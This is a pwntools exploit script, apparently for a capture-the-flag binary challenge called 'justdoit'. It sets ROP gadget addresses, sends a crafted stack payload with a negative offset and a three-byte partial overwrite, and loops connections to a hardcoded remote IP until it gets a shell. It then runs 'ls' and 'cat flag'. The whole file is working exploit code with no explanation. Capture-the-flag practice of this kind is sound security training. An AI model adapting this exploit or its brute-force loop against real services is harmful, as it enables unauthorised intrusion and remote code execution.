# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

#io = remote('127.0.0.1', 6010)
# libc = ELF('./libc-2.31.so')
# io = process(['./test', 'real'])
#io = process('./justdoit.1')
#libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))
ur64 = lambda data		: u64(data.rjust(8, b'\x00'))


main=0x4011D5
pop_rdi=0x00000000004012b3
pop_rbp=0x000000000040114d
lea_ret=0x00000000004011d3


payload=p64(0x4011A9)+p64(0x4011FF)
#payload=p64(read_lpng)+p64(read)

def pwn():
    sn(payload)
    ru('where are you from? my frends??')
    sn(str(-0x28))
    sn(str(0x000000000404020))
    
    sn('\x26\x82\x3b')
    sleep(0.1)
    sl('ls')
    sl('ls')
    ru('flag')
    sl('cat flag')
    irt()



while True:
    try:
        io=remote('47.106.172.144',65004)
        # io=process('./justdoit.1')
        pwn()
 
    except:
        io.close()
        continue
